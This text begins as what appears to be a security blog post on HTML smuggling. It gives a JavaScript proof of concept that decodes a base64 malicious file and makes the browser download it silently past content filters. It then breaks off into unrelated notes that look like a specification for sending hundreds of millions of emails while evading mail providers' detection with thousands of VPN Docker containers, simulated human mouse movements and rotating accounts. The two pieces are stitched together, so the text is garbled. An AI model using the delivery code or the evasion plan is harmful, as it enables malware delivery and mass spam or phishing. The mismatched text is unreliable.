HTML is explained

Stan Hegt
Using a combination of HTML5 and JavaScript to sneak malicious files past content filters is not a new offensive technique. This mechanism has been incorporated into popular offensive frameworks such as Demiguise and SharpShooter for example. However, from our discussions and trainings with blue teams, we have learned that many defenders are not aware of this technique or its implications. In this blog post, we will explain how a few lines of JavaScript have big impact on perimeter security.


HTML5 download attribute

HTML5 introduced the "download" attribute for anchor tags. Consider the following line of HTML, which is supported by all modern browsers:

<a href="/files/doc123.doc" download="myfile.doc">Click</a>

When a user clicks on the hyperlink, the download attribute instructs the browser to download the target pointed to by the href attribute and save it to disk as "myfile.doc". Of course, the anchor and its download attribute can also be created using JavaScript instead of HTML:

var myAnchor = document.createElement('a');
myAnchor.download = 'filename.doc';

Blobs and URLs
Nothing major so far, right? Wait until we combine this with JavaScript Blobs. A Blob is an immutable object that represents raw data. Blobs allow you to construct file-like objects on the client that you can pass to JavaScript APIs that expect URLs. Instead of requiring that the web server provides the file, the Blob can be constructed locally using pure JavaScript.

var myBlob = new Blob([myData], {type: 'octet/stream'});

This line creates a Blob of MIME type "octet/stream" and fills is with the data contained in variable myData. We can then use URL.createObjectURL to create a URL from our Blob object and have an anchor point to it:

var myUrl = window.URL.createObjectURL(blob);
myAnchor.href = myUrl;

Lastly, we can simulate a click on the anchor object using JavaScript's HTMLElement.click() method:

myAnchor.click();

This will result in triggering the anchor's click event, which in turn points to our Blob and which will be downloaded as "filename.doc" (since we specified the download attribute). These features are supported by all major modern browsers. For older versions of Internet Explorer (not Edge) we can revert to the msSaveBlob method to save a Blob object to disk.

Example code and demo
Putting it all together, the following code is a simple HTML proof of concept that delivers a file solely using HTML5 and JavaScript:


function base64ToArrayBuffer(base64) {
var binary_string = window.atob(base64);
var len = binary_string.length;
var bytes = new Uint8Array( len );
for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
return bytes.buffer;
}

var file ='<< BASE64 ENCODING OF MALICIOUS FILE >>';
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'outflank.doc';

if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
else {
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
}

Or you can send it to your coder yourself.
this is all the terms of reference in principle.
Which picture to stick we will decide in the process. also in the process will need to finalize a macro for the random picture

4. proxy is a weak option, there will be nordvpn or amazon lambdas (as in the cart) in the docker

7. Mailing is done via GET requests for fast mailing of large volumes of 100,000,000, 200,000,000 letters.
===
This is a childish variant - any mail server will kill such activity immediately. This article https://ericdraken.com/headless-chrome-vpn-docker/ describes a working variant - it will be necessary to create thousands of such docker containers and send only 10 letters from each mail account, sent by an AI emulator with mouse movements simulating human ones. Every mailer now has an AI, it recognizes all the movements in the browser, and their AI will just laugh out loud at the get requests to send hundreds of thousands of emails.

9. We put in 1000 accounts and 100 proxies, and these all 1000 accounts are assigned randomly to these 100 proxies with repetition, if there are more proxies, then 1 acre 1 proxy.
===
When you change ip in the ak will immediately begin problems with login, it is better to abandon this option, the ideal option - docker with VPN.
